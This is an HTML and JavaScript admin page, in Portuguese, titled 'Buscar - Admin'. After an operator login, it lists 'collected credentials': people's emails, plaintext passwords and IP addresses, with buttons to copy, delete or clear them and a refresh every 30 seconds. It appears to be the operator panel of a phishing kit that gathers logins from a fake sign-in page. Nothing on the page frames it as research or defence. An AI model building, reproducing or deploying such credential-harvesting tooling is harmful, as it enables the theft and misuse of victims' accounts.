<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#000000">
    <title>Buscar - Admin</title>
    <link rel="icon" href="logo.png" type="image/png">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #000000;
            --card: #1c1c1e;
            --input: #2c2c2e;
            --border: #38383a;
            --text: #ffffff;
            --text2: #8e8e93;
            --accent: #0a84ff;
            --error: #ff453a;
            --success: #30d158;
            --warning: #ff9f0a;
            --font: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: var(--font);
            background: var(--bg);
            color: var(--text);
            min-height: 100vh;
            min-height: 100dvh;
            -webkit-font-smoothing: antialiased;
        }

        /* Header */
        .header {
            position: sticky;
            top: 0;
            z-index: 100;
            background: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border-bottom: 1px solid var(--border);
            padding: 16px 20px;
        }

        .header-content {
            display: flex;
            align-items: center;
            justify-content: space-between;
            max-width: 600px;
            margin: 0 auto;
        }

        .header h1 {
            font-size: 1.25rem;
            font-weight: 700;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .header h1 img {
            width: 32px;
            height: 32px;
            border-radius: 8px;
        }

        .header-actions {
            display: flex;
            gap: 8px;
        }

        .btn-icon {
            width: 36px;
            height: 36px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: var(--input);
            border: 1px solid var(--border);
            border-radius: 10px;
            color: var(--text2);
            cursor: pointer;
            transition: all 0.2s;
            -webkit-tap-highlight-color: transparent;
        }

        .btn-icon:hover { color: var(--text); background: var(--border); }
        .btn-icon.danger:hover { color: var(--error); }

        .btn-icon svg { width: 18px; height: 18px; }

        /* Stats */
        .stats-bar {
            max-width: 600px;
            margin: 16px auto;
            padding: 0 20px;
            display: flex;
            gap: 12px;
        }

        .stat-card {
            flex: 1;
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 14px;
            padding: 14px 16px;
            text-align: center;
        }

        .stat-number {
            font-size: 1.75rem;
            font-weight: 700;
            color: var(--accent);
        }

        .stat-label {
            font-size: 0.7rem;
            color: var(--text2);
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-top: 2px;
        }

        /* Entry list */
        .entries {
            max-width: 600px;
            margin: 0 auto;
            padding: 8px 20px 100px;
        }

        .section-title {
            font-size: 0.8rem;
            font-weight: 600;
            color: var(--text2);
            text-transform: uppercase;
            letter-spacing: 0.5px;
            padding: 12px 4px 8px;
        }

        .entry-card {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 14px;
            padding: 16px;
            margin-bottom: 10px;
            animation: fadeIn 0.3s ease-out;
            transition: all 0.2s;
        }

        .entry-card:active {
            transform: scale(0.98);
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(8px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .entry-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 10px;
        }

        .entry-number {
            width: 28px;
            height: 28px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: var(--accent);
            border-radius: 8px;
            font-size: 0.75rem;
            font-weight: 700;
            color: white;
        }

        .entry-time {
            font-size: 0.75rem;
            color: var(--text2);
        }

        .entry-field {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 8px 0;
        }

        .entry-field + .entry-field {
            border-top: 1px solid rgba(56, 56, 58, 0.5);
        }

        .field-icon {
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: var(--input);
            border-radius: 8px;
            flex-shrink: 0;
        }

        .field-icon svg {
            width: 16px;
            height: 16px;
            color: var(--text2);
        }

        .field-content {
            flex: 1;
            min-width: 0;
        }

        .field-label {
            font-size: 0.7rem;
            color: var(--text2);
            text-transform: uppercase;
            letter-spacing: 0.3px;
        }

        .field-value {
            font-size: 0.95rem;
            font-weight: 500;
            color: var(--text);
            word-break: break-all;
            margin-top: 1px;
        }

        .field-value.password {
            color: var(--warning);
            font-family: 'SF Mono', 'Fira Code', monospace;
            letter-spacing: 0.5px;
        }

        .btn-copy {
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: none;
            border: 1px solid var(--border);
            border-radius: 8px;
            color: var(--text2);
            cursor: pointer;
            flex-shrink: 0;
            transition: all 0.2s;
            -webkit-tap-highlight-color: transparent;
        }

        .btn-copy:active { background: var(--border); }
        .btn-copy.copied { border-color: var(--success); color: var(--success); }

        .btn-copy svg { width: 14px; height: 14px; }

        .entry-meta {
            display: flex;
            align-items: center;
            gap: 6px;
            margin-top: 8px;
            padding-top: 8px;
            border-top: 1px solid rgba(56, 56, 58, 0.5);
        }

        .meta-tag {
            font-size: 0.65rem;
            color: var(--text2);
            background: var(--input);
            padding: 3px 8px;
            border-radius: 6px;
        }

        .btn-delete {
            margin-left: auto;
            width: 28px;
            height: 28px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: none;
            border: 1px solid rgba(255, 69, 58, 0.3);
            border-radius: 7px;
            color: var(--error);
            cursor: pointer;
            opacity: 0.6;
            transition: all 0.2s;
            -webkit-tap-highlight-color: transparent;
        }

        .btn-delete:hover, .btn-delete:active { opacity: 1; background: rgba(255, 69, 58, 0.1); }
        .btn-delete svg { width: 14px; height: 14px; }

        /* Empty state */
        .empty-state {
            text-align: center;
            padding: 60px 20px;
            color: var(--text2);
        }

        .empty-state svg {
            width: 64px;
            height: 64px;
            color: var(--border);
            margin-bottom: 16px;
        }

        .empty-state p {
            font-size: 0.9rem;
        }

        /* Auth overlay */
        .auth-overlay {
            position: fixed;
            inset: 0;
            background: var(--bg);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            padding: 20px;
        }

        .auth-overlay.hidden { display: none; }

        .auth-card {
            width: 100%;
            max-width: 360px;
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 20px;
            padding: 32px 24px;
            text-align: center;
        }

        .auth-card h2 {
            font-size: 1.25rem;
            margin-bottom: 8px;
        }

        .auth-card p {
            color: var(--text2);
            font-size: 0.85rem;
            margin-bottom: 24px;
        }

        .auth-input {
            width: 100%;
            height: 48px;
            background: var(--input);
            border: 1.5px solid var(--border);
            border-radius: 12px;
            color: var(--text);
            font-family: var(--font);
            font-size: 0.95rem;
            padding: 0 16px;
            outline: none;
            margin-bottom: 12px;
            transition: all 0.2s;
            -webkit-appearance: none;
        }

        .auth-input:focus {
            border-color: var(--accent);
            box-shadow: 0 0 0 3px rgba(10, 132, 255, 0.15);
        }

        .auth-btn {
            width: 100%;
            height: 48px;
            background: var(--accent);
            border: none;
            border-radius: 12px;
            color: white;
            font-family: var(--font);
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            margin-top: 4px;
            transition: all 0.2s;
            -webkit-tap-highlight-color: transparent;
        }

        .auth-btn:active { transform: scale(0.98); }

        .auth-error {
            color: var(--error);
            font-size: 0.8rem;
            margin-top: 12px;
            display: none;
        }

        .auth-error.show { display: block; }

        /* Logout button */
        .logout-link {
            color: var(--error);
            font-size: 0.8rem;
            margin-top: 16px;
            display: inline-block;
            cursor: pointer;
            text-decoration: none;
        }

        /* Toast */
        .toast {
            position: fixed;
            bottom: 24px;
            left: 50%;
            transform: translateX(-50%) translateY(100px);
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 12px 20px;
            font-size: 0.85rem;
            font-weight: 500;
            color: var(--text);
            z-index: 2000;
            transition: transform 0.3s ease;
            box-shadow: 0 8px 32px rgba(0,0,0,0.4);
        }

        .toast.show { transform: translateX(-50%) translateY(0); }

        /* Confirm dialog */
        .confirm-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.6);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 1500;
            padding: 20px;
        }

        .confirm-overlay.show { display: flex; }

        .confirm-card {
            width: 100%;
            max-width: 300px;
            background: var(--card);
            border-radius: 16px;
            overflow: hidden;
            text-align: center;
        }

        .confirm-body {
            padding: 24px 20px 16px;
        }

        .confirm-body h3 {
            font-size: 1.05rem;
            margin-bottom: 8px;
        }

        .confirm-body p {
            font-size: 0.85rem;
            color: var(--text2);
        }

        .confirm-actions {
            display: flex;
            border-top: 1px solid var(--border);
        }

        .confirm-actions button {
            flex: 1;
            height: 48px;
            background: none;
            border: none;
            font-family: var(--font);
            font-size: 1rem;
            cursor: pointer;
            -webkit-tap-highlight-color: transparent;
        }

        .confirm-actions button:first-child {
            color: var(--accent);
            border-right: 1px solid var(--border);
        }

        .confirm-actions button:last-child {
            color: var(--error);
            font-weight: 600;
        }
    </style>
</head>
<body>
    <!-- Auth overlay -->
    <div class="auth-overlay" id="authOverlay">
        <div class="auth-card">
            <img src="logo.png" alt="Buscar" style="width:56px;height:56px;border-radius:14px;margin-bottom:16px">
            <h2>Painel Admin</h2>
            <p>Faça login com suas credenciais de administrador</p>
            <form id="authForm">
                <input type="email" class="auth-input" id="authEmail" placeholder="Email admin" autocomplete="off">
                <input type="password" class="auth-input" id="authPassword" placeholder="Senha" autocomplete="off">
                <button type="submit" class="auth-btn">Entrar</button>
                <p class="auth-error" id="authError">Credenciais inválidas</p>
            </form>
            <a href="/" class="logout-link">← Voltar ao login</a>
        </div>
    </div>

    <!-- Main content -->
    <div id="mainContent" style="display:none">
        <div class="header">
            <div class="header-content">
                <h1>
                    <img src="logo.png" alt="logo">
                    Admin
                </h1>
                <div class="header-actions">
                    <button class="btn-icon" id="btnRefresh" title="Atualizar">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <path d="M1 4v6h6M23 20v-6h-6"/>
                            <path d="M20.49 9A9 9 0 005.64 5.64L1 10m22 4l-4.64 4.36A9 9 0 013.51 15"/>
                        </svg>
                    </button>
                    <button class="btn-icon danger" id="btnClear" title="Limpar tudo">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <polyline points="3 6 5 6 21 6"/>
                            <path d="M19 6v14a2 2 0 01-2 2H7a2 2 0 01-2-2V6m3 0V4a2 2 0 012-2h4a2 2 0 012 2v2"/>
                        </svg>
                    </button>
                    <button class="btn-icon" id="btnLogout" title="Sair">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <path d="M9 21H5a2 2 0 01-2-2V5a2 2 0 012-2h4"/>
                            <polyline points="16 17 21 12 16 7"/>
                            <line x1="21" y1="12" x2="9" y2="12"/>
                        </svg>
                    </button>
                </div>
            </div>
        </div>

        <div class="stats-bar">
            <div class="stat-card">
                <div class="stat-number" id="totalEntries">0</div>
                <div class="stat-label">Registros</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="todayEntries">0</div>
                <div class="stat-label">Hoje</div>
            </div>
        </div>

        <div class="entries" id="entriesList">
            <div class="section-title">Credenciais Coletadas</div>
        </div>
    </div>

    <!-- Toast -->
    <div class="toast" id="toast"></div>

    <!-- Confirm dialog -->
    <div class="confirm-overlay" id="confirmOverlay">
        <div class="confirm-card">
            <div class="confirm-body">
                <h3 id="confirmTitle">Confirmar</h3>
                <p id="confirmMsg">Tem certeza?</p>
            </div>
            <div class="confirm-actions">
                <button id="confirmCancel">Cancelar</button>
                <button id="confirmOk">Apagar</button>
            </div>
        </div>
    </div>

    <script>
        let adminEmail = '';
        let adminPassword = '';

        // Check URL params for auto-login
        const params = new URLSearchParams(window.location.search);
        if (params.get('e') && params.get('p')) {
            adminEmail = params.get('e');
            adminPassword = params.get('p');
            // Clean URL
            history.replaceState({}, '', '/admin.html');
            authenticate(adminEmail, adminPassword);
        }

        // Auth form
        document.getElementById('authForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const email = document.getElementById('authEmail').value.trim();
            const password = document.getElementById('authPassword').value;
            await authenticate(email, password);
        });

        async function authenticate(email, password) {
            try {
                const res = await fetch('/api/admin/auth', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, password })
                });
                const data = await res.json();
                if (data.success) {
                    adminEmail = email;
                    adminPassword = password;
                    document.getElementById('authOverlay').classList.add('hidden');
                    document.getElementById('mainContent').style.display = 'block';
                    loadData();
                } else {
                    document.getElementById('authError').classList.add('show');
                }
            } catch (err) {
                document.getElementById('authError').textContent = 'Erro de conexão';
                document.getElementById('authError').classList.add('show');
            }
        }

        // Load data
        async function loadData() {
            try {
                const res = await fetch('/api/admin/data', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email: adminEmail, password: adminPassword })
                });
                const result = await res.json();
                if (result.success) {
                    renderEntries(result.data);
                }
            } catch (err) {
                showToast('Erro ao carregar dados');
            }
        }

        // Render entries
        function renderEntries(data) {
            const container = document.getElementById('entriesList');
            const today = new Date().toDateString();
            let todayCount = 0;

            document.getElementById('totalEntries').textContent = data.length;

            let html = '<div class="section-title">Credenciais Coletadas</div>';

            if (data.length === 0) {
                html += `
                    <div class="empty-state">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                            <path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/>
                            <circle cx="12" cy="7" r="4"/>
                        </svg>
                        <p>Nenhum registro ainda</p>
                    </div>`;
            } else {
                // Show newest first
                const reversed = [...data].reverse();
                reversed.forEach((entry, i) => {
                    const realIndex = data.length - 1 - i;
                    const date = new Date(entry.timestamp);
                    if (date.toDateString() === today) todayCount++;

                    const timeStr = date.toLocaleString('pt-BR', {
                        day: '2-digit', month: '2-digit', year: '2-digit',
                        hour: '2-digit', minute: '2-digit'
                    });

                    html += `
                        <div class="entry-card" style="animation-delay: ${i * 0.05}s">
                            <div class="entry-header">
                                <div class="entry-number">${data.length - i}</div>
                                <div class="entry-time">${timeStr}</div>
                            </div>

                            <div class="entry-field">
                                <div class="field-icon">
                                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                                        <path d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/>
                                    </svg>
                                </div>
                                <div class="field-content">
                                    <div class="field-label">Email</div>
                                    <div class="field-value">${escapeHtml(entry.email)}</div>
                                </div>
                                <button class="btn-copy" onclick="copyText('${escapeHtml(entry.email)}', this)" title="Copiar">
                                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
                                        <path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/>
                                    </svg>
                                </button>
                            </div>

                            <div class="entry-field">
                                <div class="field-icon">
                                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
                                        <path d="M7 11V7a5 5 0 0110 0v4"/>
                                    </svg>
                                </div>
                                <div class="field-content">
                                    <div class="field-label">Senha</div>
                                    <div class="field-value password">${escapeHtml(entry.password)}</div>
                                </div>
                                <button class="btn-copy" onclick="copyText('${escapeHtml(entry.password)}', this)" title="Copiar">
                                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
                                        <path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/>
                                    </svg>
                                </button>
                            </div>

                            <div class="entry-meta">
                                <span class="meta-tag">${entry.ip || 'N/A'}</span>
                                <button class="btn-delete" onclick="deleteEntry('${entry.id}')" title="Apagar">
                                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                        <line x1="18" y1="6" x2="6" y2="18"/>
                                        <line x1="6" y1="6" x2="18" y2="18"/>
                                    </svg>
                                </button>
                            </div>
                        </div>`;
                });
            }

            document.getElementById('todayEntries').textContent = todayCount;
            container.innerHTML = html;
        }

        // Copy text
        function copyText(text, btn) {
            navigator.clipboard.writeText(text).then(() => {
                btn.classList.add('copied');
                showToast('Copiado!');
                setTimeout(() => btn.classList.remove('copied'), 1500);
            });
        }

        // Delete single entry
        async function deleteEntry(docId) {
            showConfirm('Apagar Registro', 'Tem certeza que deseja apagar este registro?', async () => {
                try {
                    const res = await fetch('/api/admin/delete', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ email: adminEmail, password: adminPassword, docId })
                    });
                    const data = await res.json();
                    if (data.success) {
                        showToast('Registro apagado');
                        loadData();
                    }
                } catch (err) {
                    showToast('Erro ao apagar');
                }
            });
        }

        // Clear all
        document.getElementById('btnClear').addEventListener('click', () => {
            showConfirm('Limpar Tudo', 'Tem certeza que deseja apagar TODOS os registros?', async () => {
                try {
                    const res = await fetch('/api/admin/clear', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ email: adminEmail, password: adminPassword })
                    });
                    const data = await res.json();
                    if (data.success) {
                        showToast('Dados apagados');
                        loadData();
                    }
                } catch (err) {
                    showToast('Erro ao limpar');
                }
            });
        });

        // Refresh
        document.getElementById('btnRefresh').addEventListener('click', () => {
            loadData();
            showToast('Atualizado');
        });

        // Logout
        document.getElementById('btnLogout').addEventListener('click', () => {
            window.location.href = '/';
        });

        // Toast
        function showToast(msg) {
            const toast = document.getElementById('toast');
            toast.textContent = msg;
            toast.classList.add('show');
            setTimeout(() => toast.classList.remove('show'), 2000);
        }

        // Confirm dialog
        function showConfirm(title, msg, onConfirm) {
            const overlay = document.getElementById('confirmOverlay');
            document.getElementById('confirmTitle').textContent = title;
            document.getElementById('confirmMsg').textContent = msg;
            overlay.classList.add('show');

            document.getElementById('confirmCancel').onclick = () => overlay.classList.remove('show');
            document.getElementById('confirmOk').onclick = () => {
                overlay.classList.remove('show');
                onConfirm();
            };
        }

        // Escape HTML
        function escapeHtml(str) {
            const div = document.createElement('div');
            div.textContent = str;
            return div.innerHTML;
        }

        // Auto refresh every 30 seconds
        setInterval(loadData, 30000);
    </script>
